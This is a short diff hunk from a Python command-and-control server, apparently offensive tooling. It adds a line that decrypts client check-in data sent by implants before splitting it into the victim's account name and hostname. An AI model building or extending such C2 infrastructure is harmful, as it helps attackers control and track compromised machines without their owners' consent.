@@ -52,6 +52,7 @@ class C2Handler(BaseHTTPRequestHandler):
         if self.path.startswith(CMD_REQUEST):
             # split client infos from GET initial request
             client = self.path.split(CMD_REQUEST)[1]
+            client = cipher.decrypt(client.encode()).decode() # decoder 
             client_account = client.split('@')[0]
             client_hostname = client.split('@')[1]
             
